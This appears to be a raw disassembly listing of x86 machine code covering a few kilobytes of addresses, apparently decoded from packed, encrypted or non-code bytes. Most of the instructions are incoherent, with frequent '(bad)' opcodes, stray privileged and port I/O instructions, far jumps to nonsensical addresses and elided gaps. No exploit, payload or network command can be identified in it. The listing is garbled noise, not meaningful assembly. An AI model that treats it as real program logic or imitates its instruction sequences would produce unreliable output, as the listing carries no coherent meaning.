  430788:	je     0x4307fd
  43078a:	pop    edx
  43078b:	push   0x48
  43078d:	xchg   edi,eax
  43078e:	and    dh,dh
  430790:	xlat   BYTE PTR ds:[ebx]
  430792:	or     al,0xff
  430794:	lock scas al,BYTE PTR es:[edi]
  430796:	test   BYTE PTR [edx],0xd9
  430799:	mov    dl,BYTE PTR ds:0xd3f70185
  43079f:	cmp    DWORD PTR [edi+0x29fb39ab],eax
  4307a5:	cmp    eax,0x2723daa0
  4307aa:	jae    0x4307f2
  4307ac:	adc    dh,BYTE PTR [ebp+0x27776522]
  4307b2:	std    
  4307b3:	in     eax,0x92
  4307b5:	daa    
  4307b6:	(bad)  
  4307b7:	jg     0x430786
  4307b9:	adc    al,0xb
  4307bb:	xchg   ebp,eax
  4307bc:	pop    ebp
  4307bd:	push   edx
  4307be:	mov    BYTE PTR [esi],bh
  4307c0:	(bad)  
  4307c1:	adc    eax,0x8ebaaba6
  4307c6:	mov    ebx,0x2f2be381
  4307cb:	pop    edx
  4307cc:	in     eax,dx
  4307cd:	sub    eax,0x1a167fb
  4307d2:	xchg   esp,eax
  4307d3:	jo     0x4307d7
  4307d5:	pushf  
  4307d6:	jmp    0xf3a2:0x79115b42
  4307dd:	adc    al,0x58
  4307df:	add    eax,0xac196d79
  4307e4:	shr    BYTE PTR [eax+esi*1+0x56e13e79],1
  4307eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4307ec:	or     ecx,DWORD PTR [ecx+0x18]
  4307ef:	push   ebx
  4307f0:	pop    esp
  4307f1:	push   eax
  4307f2:	xor    al,0xc2
  4307f4:	sbb    ch,BYTE PTR [edx+0x173f608a]
  4307fa:	push   esp
  4307fb:	lea    esp,[esi+0x584c524d]
  430801:	rol    BYTE PTR [ebp-0x25eacc35],1
  430807:	push   ds
  430808:	fstp   QWORD PTR [ebx-0x4c]
  43080b:	jo     0x4307e7
  43080d:	sbb    DWORD PTR [edi+ebx*2],ecx
  430810:	pop    ebx
  430811:	sbb    al,0x6f
  430813:	jmp    0x43084e
  430815:	mov    al,0xc4
  430817:	rcl    DWORD PTR [ebp+0x4a],0x4d
  43081b:	sbb    BYTE PTR [ecx+ecx*2+0x15],dl
  43081f:	jmp    0x9a6326a8
  430824:	mov    cl,0x65
  430826:	leave  
  430827:	inc    eax
  430828:	es adc al,0xf2
  43082b:	dec    eax
  43082c:	lock into 
  43082e:	neg    DWORD PTR [esi+0x21653ead]
  430834:	push   ss
  430835:	cmp    ch,BYTE PTR [ebx-0x2087bbbc]
  43083b:	mov    al,bl
  43083d:	cs hlt 
  43083f:	icebp  
  430840:	lock das 
	...
  4308b2:	add    BYTE PTR [eax],al
  4308b4:	adc    al,0x74
  4308b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4308b7:	push   ebp
  4308b8:	in     al,0xd5
  4308ba:	cmc    
  4308bb:	jne    0x4308f4
  4308bd:	pop    edi
  4308be:	adc    ebp,edx
  4308c0:	les    edi,FWORD PTR [ebx+edx*1]
  4308c3:	mov    ebp,0x20106
  4308c8:	test   BYTE PTR [eax],0x0
  4308cb:	add    BYTE PTR ds:0x9b0e340,bh
  4308d1:	adc    ah,ah
  4308d3:	rol    ebp,1
  4308d5:	leave  
  4308d6:	add    eax,0x1d78f9d6
  4308db:	(bad)  
  4308dc:	das    
  4308dd:	push   cs
  4308de:	push   ebx
  4308df:	add    ebp,DWORD PTR [edx+0x24]
  4308e2:	or     bh,BYTE PTR [esi-0x52]
  4308e5:	loope  0x43090b
  4308e7:	push   edi
  4308e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4308e9:	pop    ebx
  4308ea:	push   esi
  4308eb:	add    cl,cl
  4308ed:	(bad)  
  4308ee:	cwde   
  4308ef:	in     al,dx
  4308f0:	inc    DWORD PTR [esi+edx*8]
  4308f3:	out    dx,eax
  4308f4:	inc    ebp
  4308f5:	aas    
  4308f6:	xchg   ch,al
  4308f8:	pop    es
  4308f9:	adc    al,0x26
  4308fb:	fdiv   DWORD PTR [ecx+0x13be0db4]
  430901:	add    ch,dh
  430903:	inc    esi
  430904:	xor    BYTE PTR [esi],0xc0
  430907:	fnstsw WORD PTR [edx]
  430909:	xchg   edi,eax
  43090a:	aad    0x40
  43090c:	test   BYTE PTR [eax+eax*1-0x4c],ah
  430910:	js     0x430899
  430912:	outs   dx,BYTE PTR ds:[esi]
  430913:	in     eax,dx
  430914:	or     DWORD PTR [ebp-0x496dee68],esi
  43091a:	jge    0x43089f
  43091c:	ds xor ah,al
  43091f:	fild   DWORD PTR [eax]
  430921:	daa    
  430922:	mov    esp,0xfdb1f431
  430927:	cmc    
  430928:	fld    st(5)
  43092a:	mov    edx,0x6c15d740
  43092f:	xchg   ebx,eax
  430930:	mov    ch,0x7b
  430932:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430933:	or     eax,0x24ecaff9
  430938:	xchg   edi,eax
  430939:	ret    
  43093a:	or     BYTE PTR [edx-0x27],ah
  43093d:	inc    ecx
  43093e:	(bad)  
  43093f:	imul   DWORD PTR [ecx+eax*2+0x79]
  430943:	xchg   DWORD PTR [ebp-0x1ec28eab],ebx
  430949:	lahf   
  43094a:	xor    al,0xfe
  43094c:	xor    BYTE PTR [edi-0x1210b809],bl
  430952:	mov    ah,BYTE PTR [ebx+0x29]
  430955:	dec    edx
  430956:	iret   
  430957:	fidiv  WORD PTR [edx-0xa]
  43095a:	ds test ch,dh
  43095d:	les    ecx,FWORD PTR [ebp+esi*4+0x53]
  430961:	add    al,0x81
  430963:	int3   
  430964:	or     dh,cl
  430966:	jnp    0x43098f
  430968:	cmc    
  430969:	ret    
  43096a:	mov    eax,ds:0x802bab81
  43096f:	add    eax,0xd824a857
  430974:	sub    eax,0x30c3fde0
  430979:	aaa    
  43097a:	aad    0xae
  43097c:	xchg   edx,eax
  43097d:	pop    ds
  43097e:	adc    al,BYTE PTR [bp-0x58a]
  430983:	mov    esp,0x6d0f2a3f
  430988:	adc    ebp,DWORD PTR [edx+0x27]
  43098b:	push   esp
  43098c:	imul   edi,DWORD PTR [eax+0xd2a0309],0xffffffa8
  430993:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430994:	and    DWORD PTR [eax+0x20],edi
  430997:	push   ebx
  430998:	jge    0x430a0e
  43099a:	push   edi
  43099b:	push   edi
  43099c:	xchg   ebp,eax
  43099d:	push   0x4a
  43099f:	xor    DWORD PTR [ecx+ebp*1],0xfffffff2
  4309a3:	pop    ebp
  4309a4:	cld    
  4309a5:	fmul   DWORD PTR [ebx-0x40]
  4309a8:	mov    esp,0x33296474
  4309ad:	out    dx,al
  4309ae:	mov    dl,0xf6
  4309b0:	ret    0xfdea
  4309b3:	mov    al,0xc7
  4309b5:	sbb    eax,0xe6ce8eeb
  4309ba:	daa    
  4309bb:	aad    0xe3
  4309bd:	(bad)  
  4309be:	cmc    
  4309bf:	frstor [edx+0xc2]
	...
  430a31:	add    BYTE PTR [eax],al
  430a33:	add    BYTE PTR [ebx],bl
  430a35:	out    dx,eax
  430a36:	shl    BYTE PTR [esi],0xf4
  430a39:	aas    
  430a3a:	(bad)  
  430a3b:	out    dx,eax
  430a3c:	fwait
  430a3d:	aaa    
  430a3e:	call   0xc4e6c637
  430a43:	and    bh,ah
  430a45:	add    DWORD PTR [edx],eax
  430a47:	add    dh,dh
  430a49:	add    BYTE PTR [eax],al
  430a4b:	add    BYTE PTR [esi+0x4f662285],ah
  430a51:	dec    eax
  430a52:	xor    ebx,DWORD PTR [edi-0x76]
  430a55:	fisttp DWORD PTR ds:0x7b901a16
  430a5b:	fimul  DWORD PTR [edi-0x4c65e090]
  430a61:	fmul   st,st(5)
  430a63:	add    al,0x2a
  430a65:	jno    0x430ae1
  430a67:	mov    bl,0xd6
  430a69:	jne    0x39b04425
  430a6f:	fistp  QWORD PTR [eax]
  430a71:	push   cs
  430a72:	inc    ebx
  430a73:	adc    ah,BYTE PTR [ebp+0x479aa9ed]
  430a79:	jle    0x430a58
  430a7b:	(bad)  
  430a7d:	mov    edx,0xd56a2c18
  430a82:	inc    ebx
  430a83:	sbb    DWORD PTR [ecx-0xa],ebp
  430a86:	or     eax,0xa3bcdbf3
  430a8b:	shl    DWORD PTR [ebx-0x4c],0xc9
  430a8f:	test   al,0x4f
  430a91:	adc    al,BYTE PTR [eax-0x34]
  430a94:	mov    edi,0x876bb6aa
  430a99:	push   es
  430a9a:	in     eax,0xc3
  430a9c:	xor    bh,dl
  430a9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430a9f:	and    BYTE PTR [edi],cl
  430aa1:	pop    eax
  430aa2:	push   edx
  430aa3:	popa   
  430aa4:	shr    DWORD PTR [eax+0x6f8a859c],1
  430aaa:	mov    dh,0xb5
  430aac:	jmp    0x430aa5
  430aae:	pop    edi
  430aaf:	ins    BYTE PTR es:[edi],dx
  430ab0:	adc    ebp,esi
  430ab2:	sub    DWORD PTR [eax+0x19],0x32
  430ab6:	sub    ebx,DWORD PTR [esi+0x53e2ab69]
  430abc:	pop    ss
  430abd:	clc    
  430abe:	push   eax
  430abf:	jge    0x430a4a
  430ac1:	and    ebx,DWORD PTR [eax+0x20]
  430ac4:	int3   
  430ac5:	inc    ebp
  430ac6:	bound  ecx,QWORD PTR [edi+0x1e]
  430ac9:	shl    BYTE PTR [eax+0x37],cl
  430acc:	cli    
  430acd:	stos   DWORD PTR es:[edi],eax
  430ace:	sbb    DWORD PTR [eax+ebp*8-0x751b7e14],ecx
  430ad5:	sbb    bl,BYTE PTR [esi+edx*4+0x6c]
  430ad9:	in     eax,dx
  430ada:	cmp    ecx,edx
  430adc:	xchg   edi,eax
  430add:	cmp    BYTE PTR [edi+eiz*1+0x3d],ah
  430ae1:	and    al,0x3f
  430ae3:	push   edx
  430ae4:	xchg   ebx,eax
  430ae5:	ja     0x430adb
  430ae7:	mov    dl,bh
  430ae9:	push   eax
  430aea:	out    dx,al
  430aeb:	pop    ecx
  430aec:	and    ch,bh
  430aee:	mov    al,0x60
  430af0:	push   cs
  430af1:	and    ecx,DWORD PTR ss:[eax+0x67da9495]
  430af8:	push   ds
  430af9:	mov    eax,0xc48a5ab
  430afe:	add    esp,DWORD PTR [ebp-0x7cff906d]
  430b04:	(bad)  
  430b05:	jae    0x430b55
  430b07:	xor    dl,BYTE PTR [eax]
  430b09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430b0a:	mov    ah,0xf9
  430b0c:	inc    edi
  430b0d:	cmc    
  430b0e:	fst    QWORD PTR [ebp-0x41f04767]
  430b14:	cmp    esp,DWORD PTR [edi+ecx*1+0x58]
  430b18:	pop    edi
  430b19:	or     DWORD PTR [edi],0xc35b611e
  430b1f:	bndldx (bad),[edx+0xb]
  430b23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430b24:	imul   edi,eax,0x6fc6ead4
  430b2a:	pop    edi
  430b2b:	hlt    
  430b2c:	fld    QWORD PTR [eax+0x47]
  430b2f:	xchg   dl,cl
  430b31:	das    
  430b32:	pop    edi
  430b33:	push   es
  430b34:	jmp    0x430aeb
  430b36:	mov    edi,0x4e7dfcf6
  430b3b:	fld    TBYTE PTR [ebp-0x2dfdea32]
  430b41:	pop    edx
	...
  430bb2:	add    BYTE PTR [eax],al
  430bb4:	or     ecx,DWORD PTR [eax+0x3ba319a3]
  430bba:	mov    ebx,0x4217e69a
  430bbf:	aas    
  430bc0:	cmp    ebp,DWORD PTR [edi+edi*8+0x202f24e]
  430bc7:	add    dh,dh
  430bc9:	add    BYTE PTR [eax],al
  430bcb:	add    dl,dh
  430bcd:	or     eax,edx
  430bcf:	test   al,0x3c
  430bd1:	push   es
  430bd2:	div    BYTE PTR [ecx-0x7b5b8f24]
  430bd8:	sub    al,0x83
  430bda:	mov    ch,0xea
  430bdc:	inc    esi
  430bdd:	dec    esp
  430bde:	stos   DWORD PTR es:[edi],eax
  430bdf:	and    eax,0x9f47688f
  430be4:	jae    0x430c29
  430be6:	mov    dh,0xc1
  430be8:	jae    0x430c11
  430bea:	fmul   DWORD PTR [ebp-0x48]
  430bed:	int    0xfb
  430bef:	xchg   esi,eax
  430bf0:	leave  
  430bf1:	and    bh,BYTE PTR [ecx-0x3]
  430bf4:	lock mov cl,0xb4
  430bf7:	and    eax,0x2ea70db1
  430bfc:	sbb    DWORD PTR [edx+0x547434f],edi
  430c02:	push   esi
  430c03:	hlt    
  430c04:	lods   eax,DWORD PTR ds:[esi]
  430c05:	push   eax
  430c06:	mov    gs,ebx
  430c08:	add    al,0xaa
  430c0a:	retf   0x929e
  430c0d:	pop    eax
  430c0e:	out    0x7c,al
  430c10:	clc    
  430c11:	shr    DWORD PTR [edx+eiz*4-0x1b02e4e],cl
  430c18:	js     0x430c84
  430c1a:	jne    0x430c70
  430c1c:	mov    edx,0x87917e1d
  430c21:	cld    
  430c22:	inc    esp
  430c23:	push   ebx
  430c24:	std    
  430c25:	in     al,0x20
  430c27:	iret   
  430c28:	push   edi
  430c29:	fdivp  st(6),st
  430c2b:	pop    ebx
  430c2c:	gs jmp 0xf34a:0x630ab2bd
  430c34:	nop
  430c35:	and    ebp,DWORD PTR [edi-0xd]
  430c38:	call   0x2080:0x9d7b6c64
  430c3f:	dec    edi
  430c40:	scas   al,BYTE PTR es:[edi]
  430c41:	(bad)  
  430c42:	out    0x98,eax
  430c44:	jg     0x430cb6
  430c46:	or     eax,0x9e940372
  430c4b:	ja     0x430c87
  430c4d:	xchg   ecx,eax
  430c4e:	and    bl,ch
  430c50:	xor    eax,0xa4704fe1
  430c55:	lahf   
  430c56:	add    DWORD PTR [ecx+ecx*4],edx
  430c59:	jne    0x430beb
  430c5b:	fild   WORD PTR [eax+0x19]
  430c5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430c5f:	out    dx,al
  430c60:	xchg   ecx,eax
  430c61:	jmp    0x430c2b
  430c63:	ficom  WORD PTR [eax]
  430c65:	cmp    ah,BYTE PTR [esi+ecx*1]
  430c68:	fisubr DWORD PTR [ebx-0x2e]
  430c6b:	bound  eax,QWORD PTR [ebx]
  430c6d:	push   ebx
  430c6e:	shr    BYTE PTR [ebp+0x68],cl
  430c71:	inc    ecx
  430c72:	test   al,0x7a
  430c74:	fidiv  DWORD PTR [eax+0x6e400de6]
  430c7a:	push   edi
  430c7b:	adc    ah,ah
  430c7d:	push   0xffffffeb
  430c7f:	mov    edx,DWORD PTR [ebp+0x4fb1b81]
  430c85:	popf   
  430c86:	mov    WORD PTR [ebp-0xa],?
  430c89:	inc    ebp
  430c8a:	jle    0x430c39
  430c8c:	mov    WORD PTR [esi+0x55],?
  430c8f:	cmp    al,0x33
  430c91:	mov    edx,0x265516de
  430c96:	daa    
  430c97:	sub    BYTE PTR [edi],cl
  430c99:	retf   0x4a4f
  430c9c:	inc    eax
  430c9d:	scas   al,BYTE PTR es:[edi]
  430c9e:	enter  0x91e6,0xe2
  430ca2:	std    
  430ca3:	imul   eax,DWORD PTR [eax-0x42],0x79
  430ca7:	jle    0x430ce9
  430ca9:	scas   al,BYTE PTR es:[edi]
  430caa:	jle    0x430d0b
  430cac:	enter  0xef7a,0x52
  430cb0:	add    cl,cl
  430cb2:	test   DWORD PTR [ebp-0x7649b5c7],esp
  430cb8:	xchg   esp,eax
  430cb9:	les    esp,FWORD PTR [esi+edx*4+0x5f50272f]
  430cc0:	push   0x3a
	...
  430d31:	add    BYTE PTR [eax],al
  430d33:	add    BYTE PTR [eax-0x40],cl
  430d36:	ret    0xcaf0
  430d39:	bnd jp 0x430d34
  430d3c:	ror    BYTE PTR [ecx],1
  430d3e:	cdq    
  430d3f:	jl     0x430db2
  430d41:	fiadd  DWORD PTR [edi+0x203e8e8]
  430d47:	add    dh,dh
  430d49:	add    BYTE PTR [eax],al
  430d4b:	add    BYTE PTR [ebp+0x1c923655],al
  430d51:	fs jle 0x430dd1
  430d54:	add    al,0xa8
  430d56:	lahf   
  430d57:	add    al,0x2d
  430d59:	fsubr  st(1),st
  430d5b:	nop
  430d5c:	push   edi
  430d5d:	sbb    ebx,ebp
  430d5f:	xor    al,0xef
  430d61:	jmp    0x430da2
  430d63:	lock jne 0x430d3f
  430d66:	arpl   WORD PTR [edx+0x57],bx
  430d69:	cmp    DWORD PTR [esi+ebp*4+0x4c539d11],ecx
  430d70:	dec    esi
  430d71:	aad    0x2a
  430d73:	mov    al,0xe9
  430d75:	lock pop esi
  430d77:	jmp    0x1606cf0b
  430d7c:	push   es
  430d7d:	pop    edx
  430d7e:	leave  
  430d7f:	mov    ebp,0xaa656bbf
  430d84:	aaa    
  430d85:	and    eax,0xfea2e73b
  430d8a:	and    al,0xcf
  430d8c:	or     eax,0x9d431fa5
  430d91:	push   ss
  430d92:	repnz (bad) 
  430d94:	stos   BYTE PTR es:[edi],al
  430d95:	pushf  
  430d96:	or     dl,BYTE PTR [ecx+ebx*1-0x490bc937]
  430d9d:	lods   al,BYTE PTR ds:[esi]
  430d9e:	mov    edi,0xba7d3a27
  430da3:	outs   dx,BYTE PTR ds:[esi]
  430da4:	sub    dl,BYTE PTR [eax-0x4dedf38f]
  430daa:	sahf   
  430dab:	dec    edi
  430dac:	xlat   BYTE PTR ds:[ebx]
  430dad:	push   ebx
  430dae:	jnp    0x430dfe
  430db0:	cmp    DWORD PTR [eax],ebx
  430db2:	cli    
  430db3:	mov    ebx,0x63c90ae9
  430db8:	xchg   esi,eax
  430db9:	(bad)  
  430dba:	ds in  al,0x4e
  430dbd:	(bad)  
  430dbe:	out    dx,eax
  430dbf:	(bad)  [ebp+0x2a14d602]
  430dc5:	mov    dh,0x52
  430dc7:	mov    dl,0xa5
  430dc9:	mov    DWORD PTR [eax],0xe89977dd
  430dcf:	stos   DWORD PTR es:[edi],eax
  430dd0:	call   0x7f18:0xd14ceaa0
  430dd7:	sbb    eax,0xb0682365
  430ddc:	imul   esp,ebp,0xe369db73
  430de2:	pop    ecx
  430de3:	mov    esi,0x3d2f6175
  430de8:	int    0x35
  430dea:	cmc    
  430deb:	inc    esp
  430dec:	pop    ebp
  430ded:	pusha  
  430dee:	push   cs
  430def:	repnz xor DWORD PTR es:[ebx],0x41
  430df4:	jmp    0x430dcb
  430df6:	in     al,dx
  430df7:	das    
  430df8:	xchg   ebp,eax
  430df9:	cmp    al,0xcc
  430dfb:	inc    edx
  430dfc:	fimul  DWORD PTR [edi-0x33]
  430dff:	inc    esi
  430e00:	push   eax
  430e01:	popa   
  430e02:	adc    esp,DWORD PTR [ecx-0x4]
  430e05:	fstp   TBYTE PTR [esi-0x24851635]
  430e0b:	pusha  
  430e0c:	pop    ss
  430e0d:	(bad)  
  430e0e:	gs in  al,0xb5
  430e11:	jnp    0x430e77
  430e13:	and    ch,BYTE PTR [ecx-0xdf7fe49]
  430e19:	imul   edx,DWORD PTR [edx+0x682b2d0],0xd1c1764b
  430e23:	pop    ds
  430e24:	add    al,0x7a
  430e26:	add    BYTE PTR [ebx+0x3f6b97fb],0x64
  430e2d:	pop    edx
  430e2e:	(bad)  
  430e2f:	loopne 0x430e65
  430e31:	sahf   
  430e32:	add    DWORD PTR [ecx],edx
  430e34:	dec    ecx
  430e35:	rcr    DWORD PTR [eax+0x3339f6c4],cl
  430e3b:	or     esi,DWORD PTR [ecx]
  430e3d:	aaa    
  430e3e:	mov    esi,0xd15cf9
	...
  430eb3:	add    BYTE PTR [edi+eiz*2],al
  430eb6:	std    
  430eb7:	aaa    
  430eb8:	(bad)  
  430eb9:	mov    edi,0x8a6677ce
  430ebe:	retf   
  430ebf:	jne    0x430e8b
  430ec1:	cmp    edi,DWORD PTR [edx+eax*8-0x22]
  430ec5:	add    al,0x2
  430ec7:	add    BYTE PTR [eax-0x2b000000],bh
  430ecd:	inc    ecx
  430ece:	in     eax,0xef
  430ed0:	std    
  430ed1:	fadd   QWORD PTR [edi-0x2679e85a]
  430ed7:	or     eax,0xdb272026
  430edc:	sub    ebx,DWORD PTR [esi-0x6c]
  430edf:	push   cs
  430ee0:	lods   al,BYTE PTR ds:[esi]
  430ee1:	dec    ebp
  430ee2:	xlat   BYTE PTR ds:[ebx]
  430ee3:	cmp    esi,esi
  430ee5:	add    bl,BYTE PTR [edi-0x7cf9222e]
  430eeb:	mov    edx,0xbad67145
  430ef0:	aas    
  430ef1:	lods   al,BYTE PTR ds:[esi]
  430ef2:	stos   DWORD PTR es:[edi],eax
  430ef3:	outs   dx,BYTE PTR ds:[esi]
  430ef4:	pushf  
  430ef5:	loopne 0x430e8b
  430ef7:	pop    ebp
  430ef8:	push   edx
  430ef9:	bound  ecx,QWORD PTR [eax+0x528bca2]
  430eff:	pusha  
  430f00:	shr    ch,cl
  430f02:	cmp    dh,al
  430f04:	sub    BYTE PTR [edi],0x4f
  430f07:	push   esi
  430f08:	cmp    al,BYTE PTR [eax-0x14]
  430f0b:	dec    esp
  430f0c:	dec    DWORD PTR [edx+ecx*4+0x3d]
  430f10:	retf   
  430f11:	dec    edi
  430f12:	or     esi,DWORD PTR [ebp-0x23]
  430f15:	lds    esi,FWORD PTR [esi-0x49]
  430f18:	shl    DWORD PTR [edx+ebx*2-0x48],cl
  430f1c:	and    DWORD PTR [eax],ecx
  430f1e:	push   0x39cfcef1
  430f23:	add    DWORD PTR [eax+0x11b29d11],edi
  430f29:	call   0x3814f4e
  430f2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430f2f:	(bad)  
  430f31:	lods   al,BYTE PTR ds:[esi]
  430f32:	jl     0x430f02
  430f34:	addr16 sbb al,0xdd
  430f37:	dec    edx
  430f38:	add    ch,BYTE PTR [ecx+0x61]
  430f3b:	xchg   ebp,eax
  430f3c:	adc    BYTE PTR [ebx-0x867a6bf],ch
  430f42:	sub    BYTE PTR [eax+0x24],0x92
  430f46:	xlat   BYTE PTR ds:[ebx]
  430f47:	popa   
  430f48:	enter  0xcb54,0xa0
  430f4c:	in     eax,0xe8
  430f4e:	fdivr  DWORD PTR [ecx-0x74]
  430f51:	xchg   esi,eax
  430f52:	sar    DWORD PTR [ebx+0x20f13266],0x30
  430f59:	push   edx
  430f5a:	and    ebp,ecx
  430f5c:	mov    bl,0xbb
  430f5e:	loope  0x430f18
  430f60:	lods   eax,DWORD PTR ds:[esi]
  430f61:	sbb    bl,BYTE PTR [esi+0x77b532ec]
  430f67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430f68:	or     dh,dh
  430f6a:	pop    edi
  430f6b:	sub    al,0x32
  430f6d:	dec    edi
  430f6e:	(bad)  
  430f6f:	pop    esi
  430f70:	(bad)  
  430f71:	mov    esi,esi
  430f73:	inc    edi
  430f74:	dec    eax
  430f75:	aad    0xd2
  430f77:	lock inc ebx
  430f79:	shl    DWORD PTR [edi+0x11],cl
  430f7c:	add    BYTE PTR [edx-0x7f41d55c],dl
  430f82:	mov    bh,0x15
	...
  430fb4:	dec    ebp
  430fb5:	push   ebp
  430fb6:	mov    DWORD PTR [ebx-0x7e9f13f8],ecx
  430fbc:	mov    esp,ebp
  430fbe:	or     al,ah
  430fc0:	dec    ebp
  430fc1:	add    bh,al
  430fc3:	add    BYTE PTR [eax],cl
  430fc5:	add    BYTE PTR [eax],al
  430fc7:	mov    DWORD PTR [eax],0x3ef44545
  430fcd:	add    BYTE PTR ss:[ebp-0x70b6375],al
  430fd4:	retf   
  430fd5:	(bad)  
  430fd6:	enter  0x4d45,0xb8
  430fda:	mov    edi,DWORD PTR [ecx]
  430fdc:	hlt    
  430fdd:	test   ebx,ecx
  430fdf:	pushf  
  430fe0:	enter  0x4df8,0x8b
  430fe4:	mov    DWORD PTR [ebp+0x8],0x894708
  430feb:	inc    ebp
  430fec:	mov    ebp,0xff8bfffc
  430ff1:	dec    ebp
  430ff2:	mov    ch,0xf4
  430ff4:	call   DWORD PTR [ebx-0x1]
  430ff7:	mov    ebx,0x8005122
  430ffc:	call   DWORD PTR [ecx+0x8]
  430fff:	pop    es
  431000:	jmp    0xb8:0x9cb4533
  431007:	cdq    
  431008:	mov    esi,DWORD PTR [edx-0xc]
  43100b:	xor    al,bl
  43100d:	add    BYTE PTR [ecx+0x3c83203],bl
  431013:	mov    DWORD PTR [ecx+0x45c4084d],ecx
  431019:	mov    eax,DWORD PTR [ebx-0xb87b3]
  43101f:	xor    eax,DWORD PTR [eax]
  431021:	retf   
  431022:	ret    
  431023:	add    eax,esi
  431025:	enter  0x8945,0x64
  431029:	dec    ebp
  43102a:	sbb    ah,cl
  43102c:	add    BYTE PTR [ebx-0xb87b277],cl
  431032:	dec    DWORD PTR [ebx-0xbcfb275]
  431038:	test   DWORD PTR [ebx],esi
  43103a:	dec    ebx
  43103c:	inc    DWORD PTR [ebx]
  43103e:	inc    eax
  43103f:	enter  0x8989,0x64
  431043:	(bad)  
  431044:	jmp    FWORD PTR [ebx+ecx*4-0x1]
  431048:	cld    
  431049:	dec    DWORD PTR [ebp-0xa90001]
  43104f:	push   edi
  431050:	mov    BYTE PTR [edx+0x1],ch
  431053:	and    BYTE PTR [eax],al
  431055:	pop    ecx
  431056:	inc    ebp
  431057:	mov    DWORD PTR [ebp-0xb28ff8],ecx
  43105d:	push   0xffffff89
  43105f:	pop    ecx
  431060:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431061:	dec    ebp
  431062:	add    BYTE PTR [ecx+0x45fc088b],cl
  431068:	jne    0x4310b2
  43106a:	lea    eax,[eax]
  43106c:	fs (bad) 
  43106e:	dec    DWORD PTR [eax]
  431070:	mov    DWORD PTR [eax],eax
  431072:	test   al,0x0
  431074:	add    BYTE PTR [ebp-0x18],cl
  431077:	xor    ebp,DWORD PTR [edx]
  431079:	add    eax,DWORD PTR [eax]
  43107b:	mov    eax,eax
  43107d:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  431084:	inc    ebp
  431085:	mov    DWORD PTR [ebx+0x459408],ecx
  43108b:	popa   
  43108c:	mov    esp,DWORD PTR [ebp-0x75]
  43108f:	(bad)  
  431090:	cld    
  431091:	inc    eax
  431092:	cmp    bh,0x1
  431095:	lea    eax,[eax]
  431097:	and    BYTE PTR [eax],al
  431099:	inc    DWORD PTR [ecx-0x18]
  43109c:	mov    ecx,DWORD PTR [ebx]
  43109e:	cld    
  43109f:	add    BYTE PTR [ecx+0x75014d],cl
  4310a5:	(bad)  
  4310a6:	xchg   ebp,eax
  4310a7:	sar    bh,1
  4310a9:	inc    eax
  4310aa:	inc    DWORD PTR [eax]
  4310ac:	mov    eax,DWORD PTR [ebp-0x4]
  4310af:	xor    edx,DWORD PTR [edx+0x7201be]
  4310b5:	add    BYTE PTR [edx],dl
  4310b7:	(bad)  
  4310b8:	nop
  4310b9:	inc    ebp
  4310ba:	add    BYTE PTR [ebx-0x5afb0c00],cl
  4310c0:	mov    al,0xff
  4310c2:	add    bh,bh
  4310c4:	add    BYTE PTR [ebx],dh
  4310c6:	inc    DWORD PTR [ebx]
  4310c8:	sbb    al,0x89
  4310ca:	jne    0x4310a8
  4310cc:	mov    esp,DWORD PTR [ecx+0x4500fc]
  4310d2:	mov    eax,DWORD PTR [ebp-0xff0048]
  4310d8:	mov    DWORD PTR [eax-0x70],0xe870e989
  4310df:	inc    DWORD PTR [ebp-0x75]
  4310e2:	(bad)  [esi+ebp*8]
  4310e5:	test   DWORD PTR [esi-0x1],esp
  4310e8:	inc    ebp
  4310e9:	(bad)  
  4310ea:	aas    
  4310eb:	inc    ebp
  4310ec:	(bad)  
  4310ed:	lea    edi,[eax+edi*2-0x1]
  4310f1:	inc    edi
  4310f3:	mov    DWORD PTR [ecx],edi
  4310f5:	mov    al,ds:0x8b8000c7
  4310fa:	call   0x45d0f3fb
  4310ff:	(bad)  
  431100:	out    dx,al
  431101:	(bad)  
  431102:	fisttp WORD PTR [eax+0x8801c7]
  431108:	jecxz  0x43114f
  43110a:	call   0xe83f570e
  43110f:	lea    edi,[edi]
  431111:	(bad)  
  431112:	call   0xcb3c16
  431117:	add    DWORD PTR [ebx-0x7f570400],ecx
  43111d:	add    BYTE PTR [ecx],al
  43111f:	test   DWORD PTR [eax],eax
  431121:	wrmsr  
  431123:	jae    0x431112
  431125:	add    BYTE PTR [eax],al
  431127:	mov    eax,DWORD PTR [ebp-0x747f8a04]
  43112d:	add    esp,edi
  43112f:	add    BYTE PTR [eax+0x450108],al
  431135:	mov    edi,DWORD PTR [ebp-0x6c]
  431138:	add    DWORD PTR [eax],0x4
  43113b:	mov    eax,DWORD PTR [ebp+0x3]
  43113e:	mov    edi,DWORD PTR [esp+edi*8]
  431141:	dec    ebp
  431142:	nop
  431143:	mov    eax,DWORD PTR [ecx]
  431145:	fadd   DWORD PTR [eax]
  431147:	add    BYTE PTR [esi],al
  431149:	lea    eax,[eax]
  43114b:	pusha  
  43114c:	push   eax
  43114d:	inc    DWORD PTR [ebp+0x52]
  431150:	call   DWORD PTR [ebp-0x7b]
  431153:	mov    esi,DWORD PTR [ebp-0x74]
  431156:	mov    eax,DWORD PTR [eax]
  431158:	cld    
  431159:	mov    eax,DWORD PTR [eax+0x880103]
  43115f:	add    BYTE PTR [ebp+0x6a],bh
  431162:	cmp    edi,0x10
  431165:	mov    WORD PTR [ebp+0x0],es
  431168:	mov    edx,DWORD PTR [edx-0x4]
  43116b:	push   ecx
  43116c:	nop
  43116d:	inc    DWORD PTR [ecx]
  43116f:	cld    
  431170:	add    BYTE PTR [ebp-0x24],bh
  431173:	mov    eax,DWORD PTR [eax]
  431175:	cld    
  431176:	push   eax
  431177:	nop
  431178:	inc    ebp
  431179:	add    edi,edi
  43117b:	add    BYTE PTR [ebx+0x4de2f445],cl
  431181:	jmp    0xe33b:0x9403c733
  431188:	movntq QWORD PTR [esi],mm6
